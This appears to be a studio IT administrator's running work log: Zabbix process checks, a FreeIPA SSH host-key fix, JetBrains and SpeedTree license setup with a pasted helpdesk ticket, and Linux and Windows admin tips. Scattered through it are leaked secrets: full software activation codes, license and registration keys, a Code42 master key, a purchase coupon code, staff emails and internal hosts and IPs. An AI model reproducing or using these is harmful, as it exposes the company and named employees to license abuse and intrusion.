# Added by  --siggy 8Nov17 to test monitoring license processes
UserParameter=isotropix.status[*],ps -ef | grep isotropix | grep -v grep

@@@ test with
zabbix_agentd -t isotropix.status

select dipper -> select Items -> Create Item (Top Right) -> 

~/JOBS/DISNEYTS/ZABBIX/DOC-PICS $ import blank-item-add.jpg
~/JOBS/DISNEYTS/ZABBIX/DOC-PICS $ import isotropix-item.jpg

@@@ added:
root		/opt/isotropix/ilise/ilise
root		/usr/local/tweak/bin/tlm_server
root		/opt/videocopilot/server/vc_license_server
root		/usr/local/foundry/LicensingTools7.1/bin/FLEXlm/lmgrd.foundry
root		/usr/local/foundry/LicensingTools7.1/bin/RLM/rlm.foundry
root		/usr/pixologic/rlm/rlm
lmadmin		/opt/flexnetserver/lmgrd
lmadmin		adskflex -T dipper.disneytoonstudios.com
root		/usr/lib/sesi/sesinetd

sudo vim /etc/zabbix/zabbix_agentd.conf 

UserParameter=isotropix.status[*],ps -ef | grep isotropix | grep -v grep
UserParameter=tweak.status[*],ps -fe | grep tweak
UserParameter=videocopilot.status[*],ps -fe | grep videocopilot
UserParameter=flexlm.status[*],ps -fe | grep -i flexlm | head -1
UserParameter=rlm.status[*],ps -fe | grep -i rlm | grep -v pixologic | head -1
UserParameter=pixologic.status[*],ps -fe | grep -i pixologic | head -1
UserParameter=lmgrd.status[*],ps -fe | grep -i lmgrd | head -1
UserParameter=adskflex.status[*],ps -fe | grep -i adskflex | grep -v grep
UserParameter=sesi.status[*],ps -fe | grep -i sesi | grep -v grep | head -1

@@@ From Amy (via spreadsheet)
Server	     	Services 	Notification	Additional Info (Optional)		
ripslinger	prodman, httpd	tech-dev	prodman server - shotgun prod		
vmprodmanstage	prodman, httpd	tech-dev	prodman server - shotgun-staging		
vmprodmanel7	prodman, httpd	tech-dev	prodman server - shotgun-staging (RHEL7)		
vmroll		httpd	 	tech-dev	Roll service (RHEL6)		
vmrollel7	httpd		tech-dev	Roll service (RHEL7)		
jameson		httpd		tech-dev	Flask server for dpix web submit (REST API runs on port 5050)
vmcodesearch	codesearch	tech-dev	Code search service(RHEL7)		

******************************************************************************************************
8Nov17  ssh to meteor failed with :

dsiegfriedt@dts3329:~ $ ssh meteor
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the RSA key sent by the remote host is
18:e9:91:f5:6c:70:4c:21:69:4b:26:91:25:7d:cd:eb.
Please contact your system administrator.
Add correct host key in /disney/home/dsiegfriedt/.ssh/known_hosts to get rid of this message.
Offending RSA key in /var/lib/sss/pubconf/known_hosts:2
RSA host key for meteor has changed and you have requested strict checking.
Host key verification failed.

From the build commands I found these 2 commands that fixed the problem

/usr/bin/kinit -k -t /root/keytab.idmadmin idmadmin
/usr/bin/ipa host-mod --sshpubkey="`cat /etc/ssh/ssh_host_rsa_key.pub`" --updatedns "<hostname>.disneytoonstudios.com"

@@@ 
[root@meteor etc]# /usr/bin/ipa host-mod --sshpubkey="`cat /etc/ssh/ssh_host_rsa_key.pub`" --updatedns "<hostname>.disneytoonstudios.com"
--------------------------------------------
Modified host "meteor.disneytoonstudios.com"
--------------------------------------------
  Host name: meteor.disneytoonstudios.com
  Principal name: host/meteor.disneytoonstudios.com@DISNEYTOONSTUDIOS.COM
  SSH public key: ssh-rsa
                  AAAAB3NzaC1yc2EAAAADAQABAAABAQC3fnxkeLD3FuNHfc5WXp+saAv8HTeMAIwTr+cWppv3jsW/+I86PdqIY+Msi5FIVfn02EbI8Hn8u4LlJ0Vvij4gZjg3mfyhsh8ZGx11wpzZ5qvVD4HwPKVS385wdma7I8RzYixL2eL+WEyN0mv25OScteiR3vDh1bz7nAYTS7ifAWVizEsklnWqnGf7xyiFl6XaV95AE/INuS06xFOimGk3LlpfBoDZ6kFPXGgwlGADJtu4BPUztjSYSTPoy7J2SVxZKzD4UVF433KRPNdbQj6Y5iWUjYShl8C8RsfHOBJyTAtnOdqtQgslcedA6kRjvVStpxF2f++l1ZV/VDtM5KGh
  Class: base/7WORKSTATION/TUMBL/desktop
  Password: False
  Keytab: True
  Managed by: meteor.disneytoonstudios.com
  SSH public key fingerprint: 18:E9:91:F5:6C:70:4C:21:69:4B:26:91:25:7D:CD:EB (ssh-rsa)
[root@meteor etc]# 
@@@

******************************************************************************************************
20Nov17 (jetbrain)  pycharm license server

https://www.jetbrains.com/help/license_server/starting_stopping.html
@@@ start at top of Left column

PYCHARM:
/disney/depts/tech/soft/pycharm/pycharm-2017.2.4/

PYCHARM Licenseing:
/disney/depts/tech/soft/pycharm/pycharm-2017.2.4/license-server

@@@ to stop/start
/disney/depts/tech/soft/pycharm/pycharm-2017.2.4/license-server/bin/license-server.sh stop/start

@@@ list of commands
/disney/depts/tech/soft/pycharm/pycharm-2017.2.4/license-server/bin/license-server.sh ?
Usage:
  /bin/sh /disney/depts/tech/soft/pycharm/pycharm-2017.2.4/license-server/bin/license-server.sh <command>

<command> can be one of the following:
  configure
    configures JetBrains License Service, call "help configure" for details
  start
    starts JetBrains License Service in background, call "help start" for details
  run
    runs JetBrains License Service in the current console, call "help run" for details
  status
    prints JetBrains License Service status, call "help status" for details
  stop
    shuts JetBrains License Service down, call "help stop" for details
  restart
    restarts JetBrains License Service in background, call "help restart" for details
  rerun
    reruns JetBrains License Service in the current console, call "help rerun" for details
  dump
    provides some JetBrains License Service debug info, call "help dump" for details
  kill
    kills JetBrains License Service process
  java
    manages the path to the Java for JetBrains License Service, call "help java" for details
  help
    prints usage text
  help <command name>
    prints usage text for the specified command

LICENSE DETAILS
Type: Commercial License
Reference No*:		U368281200
Customer PO #:		4505167738
Date of issue: 05 October 2017
Subscription Pack 	1017/ECN4JCL
Billing period:		Annual
Valid through:		04 October 2018

Contact:
Annamarie Fuchs
suri.denduluri@disneytoonstudios.com

-----
License ID: CM9QCVHW1R
-----
Number of authorized users: 10

License ID #1: 2548ZDRER7  annamarie.fuchs@
License ID #2: 6Q9VJ21KYX  alan.cheney@
License ID #3: 8LX7V4YWW9  kadie.jaffe@
License ID #4: EZ3OX0CU0V  james.parks@
License ID #5: CX21AEAJZJ  richard.thompson@
License ID #6: 4GBC15DNBV
License ID #7: 1UUPOZRCAS
License ID #8: DVMADUW9IU  don.siegfriedt@
License ID #9: BJCQPNDDU4  amy.kong@
License ID #10: CM9QCVHW1R suri.denduluri@

@@@ Download activation code

~/JOBS/DISNEYTS/LICENSING/CM9QCVHW1R.txt

CM9QCVHW1R-eyJsaWNlbnNlSWQiOiJDTTlRQ1ZIVzFSIiwibGljZW5zZWVOYW1lIjoiRGlzbmV5IFRvb24gU3R1ZGlvcyIsImFzc2lnbmVlTmFtZSI6InN1cmkgZGVuZHVsdXJpIiwiYXNzaWduZWVFbWFpbCI6InRlY2gtbGljZW5zZUBkaXNuZXl0b29uc3R1ZGlvcy5jb20iLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiIiLCJjaGVja0NvbmN1cnJlbnRVc2UiOnRydWUsInByb2R1Y3RzIjpbeyJjb2RlIjoiUEMiLCJmYWxsYmFja0RhdGUiOiIyMDE3LTEwLTA1IiwicGFpZFVwVG8iOiIyMDE4LTEwLTA0In1dLCJoYXNoIjoiNjg2OTk2MS80NDY4MDY3IiwiZ3JhY2VQZXJpb2REYXlzIjo3LCJhdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlLCJpc0F1dG9Qcm9sb25nYXRlZCI6ZmFsc2V9-HrNuB12jn95fe7WSk0wZpxYo+2BH3WMjj3I1Rcrdu6NM+ZQlp5puZoSq5+ZIs1hXbarMm0E1M24X1ZSjK4eIJ93ovZWkJmM0RxaciscaODkmvSlpv70ifS94r6KhA11euXcHIMQV7cFTtFkwo5zOBFuuPIBnR1loa5DI51gAXNaKNMsEN7efSXpPrMzqaVQbL7doxRlPA41jHiPxj52UCP5SBMKqrYr7zVHEAbgT0xVTN6uswua36Ee6xevG7DBWLnL09MWwmpZjaQaV1/yFL6SKLYZGzhYx3C6f1lz6Q7X+OmGLL05QYbzOFIH/3FnnYz5+ULQwus0WItwkEY/8wQ==-MIIEPjCCAiagAwIBAgIBBTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTE1MTEwMjA4MjE0OFoXDTE4MTEwMTA4MjE0OFowETEPMA0GA1UEAwwGcHJvZDN5MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxcQkq+zdxlR2mmRYBPzGbUNdMN6OaXiXzxIWtMEkrJMO/5oUfQJbLLuMSMK0QHFmaI37WShyxZcfRCidwXjot4zmNBKnlyHodDij/78TmVqFl8nOeD5+07B8VEaIu7c3E1N+e1doC6wht4I4+IEmtsPAdoaj5WCQVQbrI8KeT8M9VcBIWX7fD0fhexfg3ZRt0xqwMcXGNp3DdJHiO0rCdU+Itv7EmtnSVq9jBG1usMSFvMowR25mju2JcPFp1+I4ZI+FqgR8gyG8oiNDyNEoAbsR3lOpI7grUYSvkB/xVy/VoklPCK2h0f0GJxFjnye8NT1PAywoyl7RmiAVRE/EKwIDAQABo4GZMIGWMAkGA1UdEwQCMAAwHQYDVR0OBBYEFGEpG9oZGcfLMGNBkY7SgHiMGgTcMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl/GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgWgMA0GCSqGSIb3DQEBCwUAA4ICAQC9WZuYgQedSuOc5TOUSrRigMw4/+wuC5EtZBfvdl4HT/8vzMW/oUlIP4YCvA0XKyBaCJ2iX+ZCDKoPfiYXiaSiH+HxAPV6J79vvouxKrWg2XV6ShFtPLP+0gPdGq3x9R3+kJbmAm8w+FOdlWqAfJrLvpzMGNeDU14YGXiZ9bVzmIQbwrBA+c/F4tlK/DV07dsNExihqFoibnqDiVNTGombaU2dDup2gwKdL81ua8EIcGNExHe82kjF4zwfadHk3bQVvbfdAwxcDy4xBjs3L4raPLU3yenSzr/OEur1+jfOxnQSmEcMXKXgrAQ9U55gwjcOFKrgOxEdek/Sk1VfOjvS+nuM4eyEruFMfaZHzoQiuw4IqgGc45ohFH0UUyjYcuFxxDSU9lMCv8qdHKm+wnPRb0l9l5vXsCBDuhAGYD6ss+Ga+aDY6f/qXZuUCEUOH3QUNbbCUlviSz6+GiRnt1kA9N2Qachl+2yBfaqUqr8h7Z2gsx5LcIf5kYNsqJ0GavXTVyWh7PYiKX4bs354ZQLUwwa/cG++2+wNWP+HtBhVxMRNTdVhSm38AknZlD+PTAsWGu9GyLmhti2EnVwGybSD2Dxmhxk3IPCkhKAK+pl0eWYGZWG3tJ9mZ7SowcXLWDFAk0lRJnKGFMTggrWjV8GYpw5bq23VmIqqDLgkNzuoog==

@@@ legacy lic
===== LICENSE BEGIN =====
2881784-31102015
00001gfaRyFEb5dG"xJovRDcS6jnK0
YcY4HvWfxbUHrknkLLNTCIwtxcbxUR
eUK17q4kttDdzvztwWLgy4jPUZCxsK
===== LICENSE END =====

-----
21Nov17

@@@ WRONG
http://dippertwo:8080
HTTP ERROR 403
Problem accessing /. Reason:
    Passed value of header "Host" is not allowed. Please contact your license server administrator.

@@@ CORRECT
http://dippertwo.disneytoonstudios.com:8080

@@@ when trying to register I get:
JetBrains Floating License Server Registration

    Disney Toon Studios account is not currently authorized to use floating license server. Please contact sales@jetbrains.com for details.


&&&
(email)
Chris Haworth (Sales)
Nov 21, 20:16 CET

Don,

The license server is only offered for customers with 50+ licenses. Because your account only holds 10 licenses, you are not able to use the floating license server.

You'll need to assign each license to a User following the steps below:

Login at:

https://account.jetbrains.com
tech-license@disneytoonstudios.com
T...

Click "Disney Toon Studios"
Click “Toolbox subs”
*Here you can assign an available license by clicking “Assign” and entering the User’s information (first, last, email) 
*To reassign: Select an assigned license, click "Manage" and choose "Revoke 1 license from User" - the license will become available and can then be assigned to someone else.

&&&&&

assigned lics to the folks and have 3 left

******************************************************************************************************
21Nov17   techstuff

joel 
[10:39 AM]
Here is the site for adding macs to the "DTS" wireless:
http://macauth.disneytoonstudios.com/

[10:41]
How to build it:
http://confluence.disneytoonstudios.com/display/TEC/vmradius-prod
******************************************************************************************************
27Nov17  line wrap for journelctl

journalctl -l --no-pager | less

******************************************************************************************************
8Dec17 speetree

@@@ from https://helpdesk.disneyanimation.com/SelfService/Display.html?id=262891

The Basics
Id:	262891
Status:	resolved
Priority:	Medium/Low
Queue:	TSE
Location:	(no value)
Host Name:	(no value)
Extension:	(no value)
Hardware:	(no value)
Type:	(no value)
Initial Priority:	(no value)
Dates
Created:	Thu Jan 28 16:58:57 2016
Starts:	Not set
Started:	Thu Jan 28 17:02:45 2016
Last Contact:	Fri Jan 29 16:05:40 2016
Due:	Not set
Closed:	Mon Feb 01 16:08:32 2016
Updated:	Mon Feb 01 16:08:32 2016 by Gisel Calvo
History Brief headers — Full headers
# Thu Jan 28 16:58:57 2016 John Readick - Ticket created [Reply] [Comment]
CC:	Benjamin Bradford <Benjamin.Bradford@disneytoonstudios.com>, Matthew Schnittker <Matthew.Schnittker@disneyanimation.com>
Subject:	Fwd: Please download and SpeedTree Studio 7
Date:	Thu, 28 Jan 2016 16:58:46 -0800
To:	tech@disneyanimation.com
From:	John Readick <John.A.Readick@disneyanimation.com>
Download (untitled) 
text/html 12k
Hello support, 

I tried to send this to the DTS tech alias, but apparently did something wonky. Can you help with these speed tree licenses? 

Thanks, 
-John 

-------- Original Message -------- Subject: Please download and SpeedTree Studio 7 Date: Tue, 26 Jan 2016 11:32:21 -0800 From: John Readick <john.a.readick@disney.com> To: DTS Technology Help <tech@disneytoonstudios.com> 

Hello DTS support, 

We purchased two speed tree licenses and have received the download link (below).  Could you contact Calin Casian about where it should be installed? Please let me know if you have any questions.  

Thanks for your help, 

-John 

-------- Original Message -------- Subject: SpeedTree Studio 7 Delivery and Activation Instructions Date: Tue, 26 Jan 2016 14:09:02 -0500 From: Kevin Meredith <meredith@idvinc.com> To: <softwarelicense@disneytoonstudios.com> CC: 'John Readick' <john.a.readick@disneyanimation.com> 

Dear Disney Toon Studio,

Walt Disney Animation Studios has purchased two licenses of SpeedTree Studio v7 on your behalf. Thank you for licensing!

To obtain the software, go to https://store.speedtree.com/ and select that product on the platform of your choice.

Then, when you go to “View Cart,” enter the following code in the Coupon field:

studiotodisneytoon1122106

Once you hit the "Apply Coupon" button, you should see a price of $0 in the “Order Total” field.

This code is good to next Monday, February 1.

Regards,
Kevin Meredith
Director, Business Development
Interactive Data Visualization, Inc. (IDV)
5446 Sunset Blvd., Suite 201
Lexington, SC 29072
Office: (803) 356-1999, ext. 10
Mobile: (803) 446-9050
FAX: (803) 356-2129
www.speedtree.com
meredith@idvinc.com
Follow Us On Twitter

-- 
You received this message because you are subscribed to the Google Groups "tech" group.
To unsubscribe from this group and stop receiving emails from it, send an email to tech+unsubscribe@disneyanimation.com.
# Thu Jan 28 17:01:42 2016 Grace Shirado - Subject changed from 'Fwd: Please download and SpeedTree Studio 7' to 'DTS: Please download and SpeedTree Studio 7'
# Thu Jan 28 17:02:01 2016 Grace Shirado - Requestor ccasian added
# Thu Jan 28 17:02:44 2016 Grace Shirado - Correspondence added [Reply] [Comment]
Download (untitled) 
text/html 116b
Hello John,

I've added Calin to this ticket.

Calin: Where should this be installed? 
# Thu Jan 28 17:02:45 2016 Grace Shirado - Status changed from 'new' to 'open'
# Thu Jan 28 17:27:07 2016 Gisel Calvo - Taken
# Thu Jan 28 18:02:44 2016 John Readick - Ticket #262899: Ticket created [Reply] [Comment]
Subject:	Please download and SpeedTree Studio 7
Date:	Tue, 26 Jan 2016 11:32:21 -0800
To:	DTS Technology Help <tech@disneytoonstudios.com>
From:	John Readick <John.A.Readick@disneyanimation.com>
Download (untitled) 
text/html 10.1k
Hello DTS support, 

We purchased two speed tree licenses and have received the download link (below).  Could you contact Calin Casian about where it should be installed? Please let me know if you have any questions.  

Thanks for your help, 

-John 

-------- Original Message -------- Subject: SpeedTree Studio 7 Delivery and Activation Instructions Date: Tue, 26 Jan 2016 14:09:02 -0500 From: Kevin Meredith <meredith@idvinc.com> To: <softwarelicense@disneytoonstudios.com> CC: 'John Readick' <john.a.readick@disneyanimation.com> 

Dear Disney Toon Studio,

Walt Disney Animation Studios has purchased two licenses of SpeedTree Studio v7 on your behalf. Thank you for licensing!

To obtain the software, go to https://store.speedtree.com/ and select that product on the platform of your choice.

Then, when you go to “View Cart,” enter the following code in the Coupon field:

studiotodisneytoon1122106

Once you hit the "Apply Coupon" button, you should see a price of $0 in the “Order Total” field.

This code is good to next Monday, February 1.

Regards,
Kevin Meredith
Director, Business Development
Interactive Data Visualization, Inc. (IDV)
5446 Sunset Blvd., Suite 201
Lexington, SC 29072
Office: (803) 356-1999, ext. 10
Mobile: (803) 446-9050
FAX: (803) 356-2129
www.speedtree.com
meredith@idvinc.com
Follow Us On Twitter

-- 
You received this message because you are subscribed to the Google Groups "tech" group.
To unsubscribe from this group and stop receiving emails from it, send an email to tech+unsubscribe@disneyanimation.com.
# Thu Jan 28 18:30:08 2016 Annamarie Fuchs - Ticket #262899: Merged into ticket #262891
# Thu Jan 28 18:30:08 2016 Annamarie Fuchs - Merged into ticket #262891
# Fri Jan 29 10:11:33 2016 Gisel Calvo - Correspondence added [Reply] [Comment]
Download (untitled) 
text/html 379b
Hi Calin,
I stopped by your desk but you were not there, let me know when you get back to install Speed Tree Studio. You can use the following link to start the download. 

https://store.speedtree.com/product/speedtree-studio/

Thanks!

-Gisel

# Fri Jan 29 11:02:33 2016 Benjamin Bradford - Correspondence added [Reply] [Comment]
CC:	Matthew Schnittker <Matthew.Schnittker@disneyanimation.com>, Niki alexander <Niki.Alexander@disneytoonstudios.com>, calin casian <Calin.Casian@disneytoonstudios.com>, Jonathan Roybal <Jonathan.Roybal@disneytoonstudios.com>
Subject:	Re: Please download and SpeedTree Studio 7
Date:	Fri, 29 Jan 2016 11:01:31 -0800
To:	John Readick <John.A.Readick@disneyanimation.com>, DTS Technology Help Desk <tech@disneytoonstudios.com>
From:	Benjamin Bradford <Benjamin.Bradford@disneytoonstudios.com>
Download (untitled) 
text/plain 2.5k
Download (untitled) 
text/html 10.1k
Hi John and Tech,

We would like the Speed Tree licenses installed on Calin Casian (Linux name: Blackbird) & Jonathan Roybal (Linux name: Electra) machines.

Thanks!




On Thu, Jan 28, 2016 at 4:58 PM, John Readick <john.a.readick@disneyanimation.com> wrote:
Hello support, 

I tried to send this to the DTS tech alias, but apparently did something wonky. Can you help with these speed tree licenses? 

Thanks, 
-John 

-------- Original Message -------- Subject: Please download and SpeedTree Studio 7 Date: Tue, 26 Jan 2016 11:32:21 -0800 From: John Readick <john.a.readick@disney.com> To: DTS Technology Help <tech@disneytoonstudios.com> 

Hello DTS support, 

We purchased two speed tree licenses and have received the download link (below).  Could you contact Calin Casian about where it should be installed? Please let me know if you have any questions.  

Thanks for your help, 
-John 

-------- Original Message -------- Subject: SpeedTree Studio 7 Delivery and Activation Instructions Date: Tue, 26 Jan 2016 14:09:02 -0500 From: Kevin Meredith <meredith@idvinc.com> To: <softwarelicense@disneytoonstudios.com> CC: 'John Readick' <john.a.readick@disneyanimation.com> 

Dear Disney Toon Studio,

Walt Disney Animation Studios has purchased two licenses of SpeedTree Studio v7 on your behalf. Thank you for licensing!

To obtain the software, go to https://store.speedtree.com/ and select that product on the platform of your choice.

Then, when you go to “View Cart,” enter the following code in the Coupon field:

Walt Disney Animation Studios has purchased two licenses of SpeedTree Studio v7 on your behalf. Thank you for licensing!

To obtain the software, go to https://store.speedtree.com/ and select that product on the platform of your choice.

Then, when you go to “View Cart,” enter the following code in the Coupon field:

studiotodisneytoon1122106

Once you hit the "Apply Coupon" button, you should see a price of $0 in the “Order Total” field.

This code is good to next Monday, February 1.

Regards,
Kevin Meredith
Director, Business Development
Interactive Data Visualization, Inc. (IDV)
446 Sunset Blvd., Suite 201
Lexington, SC 29072
Office: (803) 356-1999, ext. 10
Mobile: (803) 446-9050
FAX: (803) 356-2129
www.speedtree.com
meredith@idvinc.com
Follow Us On Twitter

Benjamin
-- 
You received this message because you are subscribed to the Google Groups "tech" group.
To unsubscribe from this group and stop receiving emails from it, send an email to tech+unsubscribe@disneyanimation.com.
# Fri Jan 29 11:09:07 2016 Gisel Calvo - Cc jonathan.roybal@disney.com added
# Fri Jan 29 11:48:34 2016 Gisel Calvo - Correspondence added [Reply] [Comment]
Download (untitled) 
text/html 227b
Hi Johnathan, 
Speed has been installed on your machine, however we are still waiting to hear back from SpeedTree regarding the license key. I will let you know as soon as it is available. Thanks!

-Gisel
# Fri Jan 29 16:05:39 2016 Gisel Calvo - Correspondence added [Reply] [Comment]
Download (untitled) 
text/html 184b
Hi John,

Speed Tree has been installed on blackbird, I ran the application and requested for a license key. Let me know when you get it. Thanks
!
-Gisel
# Mon Feb 01 16:08:32 2016 Gisel Calvo - Status changed from 'open' to 'resolved'

******************************************************************************************************
10Dec17  speedtree

@@@ on blackbird

/opt/SpeedTree_Studio_v7.1.6/linux

cd linux/lib

[root@blackbird lib]# ll
total 56284
-rw-r--r--. 1 root root 15909410 Feb 23  2017 libfbxsdk.so
-rwxr-xr-x. 1 root root  3016680 Feb 23  2017 libQtCore.so.4
-rwxr-xr-x. 1 root root 11424744 Feb 23  2017 libQtGui.so.4
-rwxr-xr-x. 1 root root  1134920 Feb 23  2017 libQtNetwork.so.4
-rwxr-xr-x. 1 root root  1037064 Feb 23  2017 libQtOpenGL.so.4
-rwxr-xr-x. 1 root root 24813016 Feb 23  2017 libQtWebKit.so.4
-rwxr-xr-x. 1 root root   282456 Feb 23  2017 libQtXml.so.4
[root@blackbird lib]# chmod +x libfbxsdk.so 
[root@blackbird lib]# ll
total 56284
-rwxr-xr-x. 1 root root 15909410 Feb 23  2017 libfbxsdk.so
-rwxr-xr-x. 1 root root  3016680 Feb 23  2017 libQtCore.so.4
-rwxr-xr-x. 1 root root 11424744 Feb 23  2017 libQtGui.so.4
-rwxr-xr-x. 1 root root  1134920 Feb 23  2017 libQtNetwork.so.4
-rwxr-xr-x. 1 root root  1037064 Feb 23  2017 libQtOpenGL.so.4
-rwxr-xr-x. 1 root root 24813016 Feb 23  2017 libQtWebKit.so.4
-rwxr-xr-x. 1 root root   282456 Feb 23  2017 libQtXml.so.4

[root@blackbird linux]# 
[root@blackbird linux]# ./SpeedTree\ Modeler\ Studio 
./SpeedTree Modeler Studio: error while loading shared libraries: libfbxsdk.so: cannot open shared object file: No such file or directory

[root@blackbird SpeedTree_Studio_v7.1.6]# cat startSpeedTreeModeler.sh 
#!/bin/sh

# Change to SpeedTree directory
CANONPATH=`readlink -f "$0"`
CANONPATH="`dirname "$CANONPATH"`"
cd "$CANONPATH"

# Set up new library path
export LD_LIBRARY_PATH="$CANONPATH"/linux/lib/:"$LD_LIBRARY_PATH"

@@@ 19Jan18  from documentation for licensing

Note: To force usage of a specific port on the RLM server, you can do so by adding a port number to the ISV line in the license file. For example:

HOST your_hostname your_hostid 
ISV idvinc port=specific_port




# Run SpeedTree Modeler
"./linux/SpeedTree Modeler Studio" $@


dsiegfriedt@blackbird:/opt/SpeedTree_Studio_v7.1.6 $ ./startSpeedTreeModeler.sh 
Fatal: Cannot mix incompatible Qt library (version 0x40805) with this library (version 0x40806)
./startSpeedTreeModeler.sh: line 12: 32788 Aborted                 (core dumped) "./linux/SpeedTree Modeler Studio" $@
dsiegfriedt@blackbird:/opt/SpeedTree_Studio_v7.1.6 $ 

11Dec17   email from speed tree to change the library path to:

# Set up new library path
export LD_LIBRARY_PATH="$CANONPATH"/linux/lib/:"$LD_LIBRARY_PATH"
unset QT_PLUGIN_PATH

Seems to work.. Doug to test.

*****************************************************************************************************
18Dec17   log into vcsa

ssh "dsiegfriedt@vsphere.local"@vcsa

******************************************************************************************************
22Dec17  RedHat RHEV 4.1 machines

rhevhost01
rhevhost02

https://rhevhost01.disneytoonstudios.com:9090/
root
(C...)

******************************************************************************************************
2Jan18  puppet install of open-vm-tools

dsiegfriedt@dts3329:~ $ rpm -qa | grep vm-tool
open-vm-tools-9.10.2-5.el7_2.x86_64
dsiegfriedt@dts3329:~ $ rpm -ql open-vm-tools-9.10.2-5.el7_2.x86_64
/etc/pam.d/vmtoolsd
/etc/vmware-tools
/etc/vmware-tools/guestproxy-ssl.conf
/etc/vmware-tools/poweroff-vm-default
/etc/vmware-tools/poweron-vm-default
/etc/vmware-tools/resume-vm-default
/etc/vmware-tools/scripts
/etc/vmware-tools/scripts/vmware
/etc/vmware-tools/scripts/vmware/network
/etc/vmware-tools/statechange.subr
/etc/vmware-tools/suspend-vm-default
/usr/bin/vm-support
/usr/bin/vmtoolsd
/usr/bin/vmware-checkvm
/usr/bin/vmware-guestproxycerttool
/usr/bin/vmware-hgfsclient
/usr/bin/vmware-rpctool
/usr/bin/vmware-toolbox-cmd
/usr/bin/vmware-xferlogs
/usr/lib/systemd/system/vmtoolsd.service
/usr/lib64/libDeployPkg.so.0
/usr/lib64/libDeployPkg.so.0.0.0
/usr/lib64/libguestlib.so.0
/usr/lib64/libguestlib.so.0.0.0
/usr/lib64/libhgfs.so.0
/usr/lib64/libhgfs.so.0.0.0
/usr/lib64/libvmtools.so.0
/usr/lib64/libvmtools.so.0.0.0
/usr/lib64/open-vm-tools
/usr/lib64/open-vm-tools/plugins
/usr/lib64/open-vm-tools/plugins/common
/usr/lib64/open-vm-tools/plugins/common/libhgfsServer.so
/usr/lib64/open-vm-tools/plugins/common/libvix.so
/usr/lib64/open-vm-tools/plugins/vmsvc
/usr/lib64/open-vm-tools/plugins/vmsvc/libdeployPkgPlugin.so
/usr/lib64/open-vm-tools/plugins/vmsvc/libgrabbitmqProxy.so
/usr/lib64/open-vm-tools/plugins/vmsvc/libguestInfo.so
/usr/lib64/open-vm-tools/plugins/vmsvc/libpowerOps.so
/usr/lib64/open-vm-tools/plugins/vmsvc/libtimeSync.so
/usr/lib64/open-vm-tools/plugins/vmsvc/libvmbackup.so
/usr/share/doc/open-vm-tools-9.10.2
/usr/share/doc/open-vm-tools-9.10.2/AUTHORS
/usr/share/doc/open-vm-tools-9.10.2/COPYING
/usr/share/doc/open-vm-tools-9.10.2/ChangeLog
/usr/share/doc/open-vm-tools-9.10.2/NEWS
/usr/share/doc/open-vm-tools-9.10.2/README
/usr/share/open-vm-tools
/usr/share/open-vm-tools/messages
/usr/share/open-vm-tools/messages/de
/usr/share/open-vm-tools/messages/de/toolboxcmd.vmsg
/usr/share/open-vm-tools/messages/de/vmtoolsd.vmsg
/usr/share/open-vm-tools/messages/ja
/usr/share/open-vm-tools/messages/ja/toolboxcmd.vmsg
/usr/share/open-vm-tools/messages/ja/vmtoolsd.vmsg
/usr/share/open-vm-tools/messages/ko
/usr/share/open-vm-tools/messages/ko/toolboxcmd.vmsg
/usr/share/open-vm-tools/messages/ko/vmtoolsd.vmsg
/usr/share/open-vm-tools/messages/zh_CN
/usr/share/open-vm-tools/messages/zh_CN/toolboxcmd.vmsg
dsiegfriedt@dts3329:~ $ 

3Jan18 had to back it out... too many errors on physical machines

******************************************************************************************************
3Jan18  windows build from satillite

reboot +> click F12 +> 

over to wds +> pending device +> Rt click and approve  +> should start building... must select what build you want

only win10 and surface available today

&&&&&

May have to build from 2012R? template (see below)

******************************************************************************************************
3Jan18

Remove sophosvm (vmware from disk, and from satellite)

Build sophosvm from template (2012R2)

add sophosvm (new host) to satellite

SERVERS USE DHCP... don't set a static IP (no matter what the notes below say)


@@@ change IP with command line
@@@ https://www.howtogeek.com/103190/change-your-ip-address-from-the-command-prompt/

@@@ get interface name
netsh interface ipv4 show config

@@@ to change syntax
netsh interface ipv4 set address name="YOUR INTERFACE NAME" static IP_ADDRESS SUBNET_MASK GATEWAY

@@@ so for sophosvm it is:
netsh interface ipv4 set address name="Ethernet0" static 10.106.228.9 255.255.252.0 10.106.231.254


******************************************************************************************************
3Jan18   looking for planes

sudo ll /disney/archive/SHOWS_archive/FIRE_AND_RESCUE/FINAL_ARCHIVE_DELIVERY/FireAndRescue_final/

******************************************************************************************************
11Jan18  RHEV console (FPOSMFBWD)

dsiegfriedt@dts3329:~/Downloads $ remote-viewer --spice-debug console.vv

******************************************************************************************************
11Jan18  list all enables processes
https://askubuntu.com/questions/795226/how-to-list-all-enabled-services-from-systemctl

systemctl list-unit-files | grep enabled
systemctl list-unit-files --state=enabled

******************************************************************************************************
11Jan18  to change runlevel to 5 with systemctl

@@@ where you at
systemctl get-default

@@@ set to runlevel 5 (graphical)
systemctl set-default graphical.target

@@@ set to runlevel 3
systemctl set-default multi-user.target



******************************************************************************************************
17Jan18 code42 license info

Order details:

ORDER DATE: 01/16/18

ORDER ID: 1007539788

PO NUMBER: 4505269396

ORGANIZATION: DisneyToon Studios - The Walt Disney Company

REG KEY: 9UKR-U47K-T744-7HP2

Master License Key
To be used for first-time server and new storage node setups

l8KxUfRI5QQDvySo/mA7OPjmz2Mn+LkJpGevEf6i2ymkijA7PbF7J2FRgXcA
89NtKi9bJ3U+IC+Pytttohx4uUEQzHH8ZkJJ1OoP1WwaPlk5VKQK2weWllv9
mo9s2WoFanQ4uDtCP+p2egCLy5OFszRVsvu55cIjmL7rwYtn0PY=

Version 6.0 and later:

Your Code42 subscriptions are applied automatically. To view your new subscriptions:


